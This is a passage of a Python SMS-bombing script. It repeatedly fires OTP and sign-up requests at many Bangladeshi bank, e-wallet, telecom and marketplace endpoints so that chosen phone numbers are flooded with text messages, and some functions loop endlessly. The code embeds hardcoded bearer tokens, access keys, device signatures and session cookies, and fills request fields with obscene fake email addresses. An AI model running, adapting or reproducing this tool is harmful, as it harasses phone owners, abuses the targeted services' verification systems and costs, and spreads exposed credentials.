            requ_nesco_server = requests.post(url_nesco, headers=headers_nesco, data=data_nesco)
            if requ_nesco_server.json()["message"] == "OTP has been Sent.":
                printchar(f"{greenBold}    A SMS SENT FROM NESCO IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM NESCO IN +888{num}", 0.001)
        except:
            pass

    print("\n")
    for num in numbers_all:
        # MOKAM
        try:
            url_mokam = "https://ucapi.vnksrvc.com/users/send_user_otp.json"
            headers_mokam = {"Content-Type": "application/json"}
            data_mokam = '{"direct_login": true,"user": {"resend": false,"login": "88' + num + '","type": {"register": true}}}'
            requ_mokam_server = requests.post(url_mokam, headers=headers_mokam, data=data_mokam)
            if requ_mokam_server.json()["message"] == f"An OTP has been sent to 88{num}.":
                printchar(f"{greenBold}    A SMS SENT FROM MOKAM IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM MOAKM IN +888{num}", 0.001)
        except:
            pass

    print("\n")
    for num in numbers_all:
        # NBL
        try:
            url_nbl = "https://accountnow.nblbd.com/api/otp-request"
            headers_nbl = {"Content-Type": "application/json"}
            data_nbl = '{"mobile":"' + num + '"}'
            requ_nbl_server = requests.post(url_nbl, headers=headers_nbl, data=data_nbl)
            if requ_nbl_server.json()["message"] == "OTP Sended successfully.":
                printchar(f"{greenBold}    A SMS SENT FROM NBL INFO IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM NBL INFO IN +888{num}", 0.001)
        except:
            pass
    print("\n")
    for num in numbers_all:
        # Dmoney
        try:
            url_token = "https://api.dmoney.com.bd:3033/Dmoney/Token"
            headers_token = {"Authorization": "Basic, E8xlkWsSjZKBZ8yQ6VjaQIUM9tUfo/bPdrOy+BATiwc=",
                             "Content-Type": "application/x-www-form-urlencoded",
                             "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; A5010 Build/N2G48H)",
                             "Host": "api.dmoney.com.bd:3033",
                             "Connection": "close",
                             "Accept-Encoding": "gzip, deflate",
                             "Content-Length": "20"}
            data_token = "grant_type=password&="
            resp_token = requests.post(url_token, headers=headers_token, data=data_token)
            url_dmoney = "https://api.dmoney.com.bd:3033/DmoneyPlatform/um_customer_create"
            headers_dmoney = {
                "productCode": "DM",
                "Authorization": "bearer " + resp_token.json()["access_token"],
                "accept-language": "en",
                "Content-Type": "application/json",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; A5010 Build/N2G48H)",
                "Host": "api.dmoney.com.bd:3033",
                "Connection": "close",
                "Accept-Encoding": "gzip, deflate",
                "Content-Length": "638"}
            data_dmoney = '{"clientType":"dmoney-customer-wallet","dateOfBirth":"04\/11\/1996","email":"aru1234@yahoo.com","fullName":"ARU","mobileNumber":"' + num + '","operatorCode":"3","pin":"qLg\/BH8nl1IzjzVtgPx8mQ==","pinHMac":"mwUD43\/XYDBN4gs0fMQxtBJqVGSod2NZRlUvq6QnN4E=","referralCode":"","userType":"5","deviceName":"OnePlus A5010 Android 7.1.2","deviceNumber":"e57cd87b2c9b47b1","hardwareSignature":"20ad24ea74d4efdbf96413fb97f428cd6227f157610655ebeeb6c87d2b8bbd9bbdd0a343b4ba09ddda9b69de8bf5770edb618e3820bf0ff7fb8d777612a7f0f1","mobileAppVersion":"2.2.2_DM","mobileAppVersionCode":53,"productCode":"DM","requestId":"42EE607762F2F08A","sessionToken":""}'
            requ_dmoney_server = requests.post(url_dmoney, headers=headers_dmoney, data=data_dmoney)
            if requ_dmoney_server.status_code == 200:
                printchar(f"{greenBold}    A SMS SENT FROM DMONEY IN +888{num}", 0.001)

            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM DMONEY IN +888{num}", 0.001)

        except:
            pass
    print("\n")
    for num in numbers_all:
        # Bikroy
        try:
            url_bikroy = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" + num
            requ_bikroy_server = requests.get(url_bikroy)
            if requ_bikroy_server.json()["otp_length"] == 6:
                printchar(f"{greenBold}    A SMS SENT FROM Bikroy.com IN +888{num}", 0.001)

            else:
                printchar(f"{redBold}    A SMS NOT FROM Bikroy.com SENT IN +888{num}", 0.001)
        except:
            pass
    print("\n")
    for num in numbers_all:
        # WEB ONE
        try:
            url_web_one = "http://27.131.15.19/lstyle/api/lsotprequest"
            headers_web_one = {"Content-Type": "application/json"}
            data_web_one = '{"shortcode":"2494905","msisdn":"88' + num + '"}'
            requ_web_one_server = requests.post(url_web_one, headers=headers_web_one, data=data_web_one)
            if requ_web_one_server.json()["reponse"] == "SUCCESSFUL":
                printchar(f"{greenBold}    A SMS SENT IN +888{num}", 0.001)

            else:
                printchar(f"{redBold}    A SMS NOT SENT IN +888{num}", 0.001)
        except:
            pass
    print("\n")
    for num in numbers_all:
        # # Two
        try:
            url_web_two = "http://27.131.15.19:80/lstyle/api/lsotprequest"
            headers_web_two = {"Content-Type": "application/json"}
            data_web_two = '{"shortcode":"2494905","msisdn":"88' + num + '"}'
            requ_web_two_server = requests.post(url_web_two, headers=headers_web_two, data=data_web_two)
            if requ_web_two_server.json()["reponse"] == "SUCCESSFUL":
                printchar(f"{greenBold}    A SMS SENT IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT IN +888{num}", 0.001)
        except:
            pass
    print("\n")
    for num in numbers_all:
        try:
            url_drive = "https://www.mydrivebd.com/sapi/profile?action=signup&notify=true&rid=0.14346360928321888"
            headers_drive = {"Host": "www.mydrivebd.com",
                             "content-length": "126",
                             "x-deviceid": "web-08474b7fff1202e709e8935c10cf5ca3",
                             "content-type": "application/json;charset=UTF-8",
                             "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo Y85) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
                             "accept": "*/*",
                             "origin": "https://www.mydrivebd.com",
                             "sec-fetch-site": "same-origin",
                             "sec-fetch-mode": "cors",
                             "sec-fetch-dest": "empty",
                             "referer": "https://www.mydrivebd.com/",
                             "accept-encoding": "gzip, deflate, br",
                             "accept-language": "en-US,en;q=0.9",
                             "cookie": "JSESSIONID=0E317BDBE17C4F72F27F47F3047D50FE.1i164",
                             "cookie": "loginRetriesLeft=5",
                             "cookie": "loginRetriesLeft_Date=%3B%20expires%3DTue%2C%2027%20Sep%202022%2021%3A39%3A57%20GMT",
                             "cookie": "cookiesAccepted=true",
                             "cookie": "_ga_G32R4HEST2=GS1.1.1664228417.1.0.1664228417.0.0.0",
                             "cookie": "_ga=GA1.1.1935620814.1664228418"}
            data_drive = '{"data":{"user":{"generic":{"userid":"88' + num + '","password":"' + ''.join(
                random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in
                range(15)) + '","l10n":"en","acceptedtermsandconditions":true}}}}'
            requ_drive_server = requests.post(url_drive, headers=headers_drive, data=data_drive)
            if requ_drive_server.status_code == 200:
                printchar(f"{greenBold}    A SMS SENT FROM MY DRIVE IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM MY DRIVE IN +888{num}", 0.001)
        except:
            pass
    print("\n")
    for num in numbers_all:
        try:
            url_lanka = "https://napi.dmoney.com.bd:6066/DmoneyPlatform/um_public_ekyc_checkMobileEmail"
            headers_lanka = {"productCode": "FS",
                             "Authorization": "bearer 9gp0IvDK_5DX1StqaF4__rHnboeHCwayrMsdZ3aNGhoF1jykX7xyoQBASWnSTbnZ5NmMXDinOBhI4rjy-0mXcoPUsFu7Xbdga-sy3TunDsxToMzLqn-zB_3Opi7FbHOLU47kQFLzkPdF8_QADX9eC3Sy-j9IBH5JnoSvL4YADKZic6D_Ok8j7zwfWy3kcXKRgyFje5ft0s-5ztXWGUy-6YOGdbThWoy6LBbK_Yr3Ek8YYGi6",
                             "accept-language": "en", "Content-Type": "application/json",
                             "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H)",
                             "Host": "napi.dmoney.com.bd:6066", "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
                             "Content-Length": "493"}
            data_lanka = '{"ekycApplicationData":{"emailId":"mr_kille@yahoo.com","id":0,"mobileNumber":"' + num + '","productCode":"FS"},"channel":"ANDROID_APP","deviceName":"Asus ASUS_Z01QD Android 7.1.2","deviceNumber":"751405a75d71e619","hardwareSignature":"14879d1fcce97c13dd673ee7ce6d7f1c69f56f8880c2d2326f675473472c1dcefb603902376020fc0a75d8a3868a84ebb5c1211abe38c75583d412783bbfcb40","mobileAppVersion":"4.1.1_RELEASE","mobileAppVersionCode":37,"productCode":"FS","requestId":"2015BDC18305FBFB","sessionToken":""}'
            requ_lanka_server = requests.post(url_lanka, headers=headers_lanka, data=data_lanka)
            if requ_lanka_server.json()['status'] == 200 and requ_lanka_server.json()['errors'] == None:
                printchar(f"{greenBold}    A SMS SENT FROM LBFL IN +888{num}", 0.001)

            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM LBFL IN +888{num}", 0.001)

        except:
            pass
    print("\n")
    for num in numbers_all:
        # TAP
        try:
            ID = uuid.uuid4()
            url_tap = "https://api.bdkepler.com/api_middleware-0.0.2-RELEASE/registration-generate-otp"
            headers_tap = {"Content-Type": "application/json"}
            data_tap = '{"deviceId":"' + str(ID) + '","operator":"Robi","walletNumber":"' + num + '"}'
            requ_tap_server = requests.post(url_tap, headers=headers_tap, data=data_tap)
            if requ_tap_server.status_code == 200 and requ_tap_server.json()['statusCode'] == 200:
                printchar(f"{greenBold}    A SMS SENT FROM TAP IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM TAP IN +888{num}", 0.001)
        except:
            pass
    print("\n")
    for num in numbers_all:
        # KIri Shop
        try:
            url_monach = "https://retailer.ifarmer.asia/api/v1/retailers/sign_up"
            headers_monach = {"Content-Type": "application/x-www-form-urlencoded"}
            data_monach = 'phone=%2B88' + num
            requ_monach_server = requests.post(url_monach, headers=headers_monach, data=data_monach)
            if requ_monach_server.status_code == 201:
                printchar(f"{greenBold}    A SMS SENT FROM KRI-SHOP IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM KRI-SHOP IN +888{num}", 0.001)
        except:
            pass
    print("\n")
    for num in numbers_all:
        # madhumati
        try:
            url_madhumati = "https://mmbl-eaccount.modhumotibank.net/api/otp-request"
            headers_madhumati = {"Content-Type" : "application/json"}
            data_madhumati = '{"mobile":"'+num+'"}'
            requ_madhumati_server = requests.post(url_madhumati, headers=headers_madhumati, data=data_madhumati)
            if requ_madhumati_server.json()["message"] == "OTP Sended successfully.":
                printchar(f"{greenBold}    A SMS SENT FROM MMBL IN +888{num}", 0.001)

            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM MMBL IN +888{num}", 0.001)
        except:
            pass
    print("\n")
    for num in numbers_all:
        # uttara
        try:
            url_uttara = "https://ibanking.uttarabank-bd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber"
            headers_uttara = {"Content-Type" : "application/json"}
            data_uttara = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+num+'","otpSms":"","product_id":"111","requestChannel":"MOB","trackingStatus":5}'
            requ_uttara_server = requests.post(url_uttara, headers=headers_uttara, data=data_uttara)
            if requ_uttara_server.json()["message"] == "OTP Generated":
                printchar(f"{greenBold}    A SMS SENT FROM UTTARA BANK IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM UTTARA BANK IN +888{num}", 0.001)
        except:
            pass
    print("\n")
    for num in numbers_all:
        # midland
        try:
            url_midland = "https://direct.midlandbankbd.net/selfekyc/api/Enrollment"
            headers_midland = {"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Dalvik/2.1.0 (Linux; U; Android 7.1.2; A5010 Build/N2G48H)","Host":"direct.midlandbankbd.net","Connection":"close","Accept-Encoding":"gzip, deflate","Content-Length":"194"}
            data_midland = "email=fuckyou%40yahoo.com&channel=A&mobile="+num+"&accesskey=25418d3c2fae43648b99aedd33386d803dda43e9c15e0628eb1177a2fda93335a8cd001d6bdcb3cef7881ccd3b8cba3278d308b925ae4df634b480974ca07d21&"
            requ_midland_server = requests.post(url_midland, headers=headers_midland, data=data_midland)
            if requ_midland_server.status_code == 200:
                printchar(f"{greenBold}    A SMS SENT FROM MIDLAND BANK IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM MIDLAND BANK IN +888{num}", 0.001)
        except:
            pass

    print("\n")
    for num in numbers_all:
    # nrb
        try:
            url_nrb = "https://www.nrbbankbd.com/online-application/account/upload.php?action=login"
            headers_nrb = {"Content-Type":"application/x-www-form-urlencoded"}
            data_nrb = "applicant_email=fuckYou@yahoo.com&applicant_mobile="+num+"&proceed=Proceed"
            requ_nrb_server = requests.post(url_nrb, headers=headers_nrb, data=data_nrb)
            if requ_nrb_server.text == "true":
                printchar(f"{greenBold}    A SMS SENT FROM NRB BANK IN +888{num}", 0.001)

            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM NRB BANK IN +888{num}", 0.001)
        except:
            pass
    print("\n")
    for num in numbers_all:
        # LANKA 2
        try:
            url_lanka_bn2 = "https://www.lankabangla.com/personal-loan-application/upload.php?action=login"
            headers_lanka_bn2 = {"Content-Type":"application/x-www-form-urlencoded"}
            data_lanka_bn2 = "applicant_email=fuckYou@yahoo.com&applicant_mobile="+num+"&proceed=Proceed"
            requ_lanka_bn2_server = requests.post(url_lanka_bn2, headers=headers_lanka_bn2, data=data_lanka_bn2)
            if requ_lanka_bn2_server.text == "true":
                printchar(f"{greenBold}    A SMS SENT FROM LBFL IN +888{num}", 0.001)

            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM LBFL IN +888{num}", 0.001)

        except:
            pass

    for num in numbers_all:
        # EBL
        try:
            url_ebl = "https://insta.ebl-bd.com/eblEkyc/postRegistration;jsessionid=iZVEPUNNbCH68x3Hn22jwThCQK0zqBNKkaMs2jx-w1vfaGGQonBb!-1086432445"
            headers_ebl = {"Content-Type":"application/x-www-form-urlencoded"}
            data_ebl = "vcCustName=Pudina&vcCustEmail=Fuck%40gmail.com&vcCustMob="+num+"&vcPassword=12345678&confirmPassword=12345678"
            requ_ebl_server = requests.post(url_ebl, headers=headers_ebl, data=data_ebl)
            if requ_ebl_server.status_code == 200:
                printchar(f"{greenBold}    A SMS SENT FROM LBFL IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM LBFL IN +888{num}", 0.001)
        except:
            pass
    for num in numbers_all:
        # Sahjalal
        try:
            url_sahjalal = "https://eaccount.sjiblbd.com/VerifIDEXT/api/CustOnBoarding/VerifyMobileNumber"
            headers_sahjalal = {"Content-Type": "application/json",}
            data_sahjalal = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"121","requestChannel":"MOB","trackingStatus":5}'
            requ_sahjalal_server = requests.post(url_sahjalal, headers=headers_sahjalal, data=data_sahjalal)
            if requ_sahjalal_server.json()['message'] == 'OTP Generated':
                printchar(f"{greenBold}    A SMS SENT FROM SAHJALAL BANK IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM SAHJALAL BANK IN +888{num}", 0.001)
        except:
            pass

def robi_airtel_multi():
    # global opa
    banner_premium()
    number_mu = str(input(f"  {random.choice(colorArr)}  ENTER NUMBERS [use space to separate number]: {random.choice(colorArr)}"))
    numbers_all = str.split(number_mu)
    i=0
    number_mul = []
    for num in numbers_all:
        if num in numbers:
            i += 1
            printchar(f"{greenBold}    NUMBER {str(i)}: {cyanBold}+88{num} {redBold}[PROTECTED NUMBER]{end}", 0.01)
            pass
        else:
            op_t = num[:3]
            i += 1
            if op_t == '018':
                opa = 'robi'
                printchar(f"{greenBold}    NUMBER {str(i)}: {cyanBold}+88{num} ", 0.01)
                number_mul.append(num)
            elif op_t == '016':
                opa = 'airtel'
                printchar(f"{greenBold}    NUMBER {str(i)}: {cyanBold}+88{num} ", 0.01)
                number_mul.append(num)
            else:
                printchar(f"{greenBold}    NUMBER {str(i)}: {cyanBold}+88{num} {redBold}[NOT ROBI/AIRTEL NUMBER]{end}", 0.01)
                pass

    number_multi = ' '.join(str(x) for x in number_mul)

    while True:
        print("\n")
        att_robi(number_multi,opa)
def att_robi(number_multi,oparetor):
    numbers_all = str.split(number_multi)
    if len(numbers_all) == 0:
        sys.exit()
    else:
        pass
    for num in numbers_all:
        try:
            url_my_robi = "https://singleapp.robi.com.bd/api/v1/tokens/create_opt"
            headers_my_robi = {
            "Platform" : "android",
            "Appname" : oparetor,
            "Deviceid" : "1117297acfc89586",
            "Appversion" : "5.4.3",
            "Locale" : "en",
            "Content-Type" : "application/x-www-form-urlencoded",
            "Content-Length" : "20",
            "Accept-Encoding" : "gzip, deflate",
            "User-Agent" : "okhttp/4.2.2",
            "Connection" : "close"}
            data_my_robi = "msisdn=88"+num
            requ_my_robi_server = requests.post(url_my_robi, headers=headers_my_robi, data=data_my_robi)
            if requ_my_robi_server.json()["content"] == "Otp successfully send to user":
                printchar(f"{greenBold}    A SMS SENT IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT IN +888{num}", 0.001)
        except:
            pass
def upai(number):
    op_v = number[:3]
    if op_v == "018":
        oparetor = "Robi"
    elif op_v == "016":
        oparetor = "Airtel"
    elif op_v == "017" or op_v == "013":
        oparetor = "Grameenphone"
    elif op_v == "019" or op_v == "014":
        oparetor = "Banglalink"
    elif op_v == "015":
        oparetor = "Teletalk"
    url_1 = "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/"
    headers_1 = {
        "Authorization": "JWT",
        "Accept-Language": "en",
        "E-App-Version": "2.4.2",
        "E-App-Name": "customer",
        "E-Platform": "Android",
        "E-App-Build-Number": "40",
        "E-Request-Id": "1668865520770",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": "okhttp/3.14.9"}
    data_1 = '{"device_uuid":"c65m117a2be3645186db5212","firebase_token":"fFUFEfRyTZmLOGi2fTrpIm:APA91bFBf3kudQFxkIDiPL9hPOjxHgjkeFpIzz62C5MGMC7ydU-I2Fw3KO7zBFZyuVC3iERa0cm0aB3RDobYJaTz891-I2E20TL4cxCfySFqrPs5RQbZuh7raNTOKvorvNnUiw7fZHtz","geo_location":{"lat":0.0,"long":0.0},"mno":"' + oparetor + '","wallet_number":"' + number + '","referral":""}'
    resp_1 = requests.post(url_1, headers=headers_1, data=data_1)
    print(random.choice(colorArr)+ resp_1.text)
    try:
        id = str(resp_1.json()['data']['temp_registration']['id'])
    except:
        printchar(f"{redBold}    PLEASE TRY AGAIN FEW MIN ", 0.001)
        sys.exit()
    url_2 = "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification/otp-resend/"
    data_2 = '{"wallet_number":"' + number + '","device_uuid":"c65m117a2be3645186db5212","mno":"' + oparetor + '","firebase_token":"fFUFEfRyTZmLOGi2fTrpIm:APA91bFBf3kudQFxkIDiPL9hPOjxHgjkeFpIzz62C5MGMC7ydU-I2Fw3KO7zBFZyuVC3iERa0cm0aB3RDobYJaTz891-I2E20TL4cxCfySFqrPs5RQbZuh7raNTOKvorvNnUiw7fZHtz","temp_registration_id":' + id + ',"geo_location":{"lat":0.0,"long":0.0}}'
    while True:
        resp = requests.post(url_2, headers=headers_1, data=data_2)
        print(random.choice(colorArr) + resp.text)
def madico(number):
    try:
        while True:
            url_sahjalal = "https://api.v2.medico.bio/patient/passwordless-login"
            headers_sahjalal = {"Content-Type": "application/json", }
            data_sahjalal = '{"channel":"android","deviceId":"2be3645186db5212","phoneNumber":"' + number + '","type":"newUser","userType":"patient"}'
            requ_sahjalal_server = requests.post(url_sahjalal, headers=headers_sahjalal, data=data_sahjalal, verify=False)
            print(random.choice(colorArr) + requ_sahjalal_server.text)
    except Exception as err:
        print(err)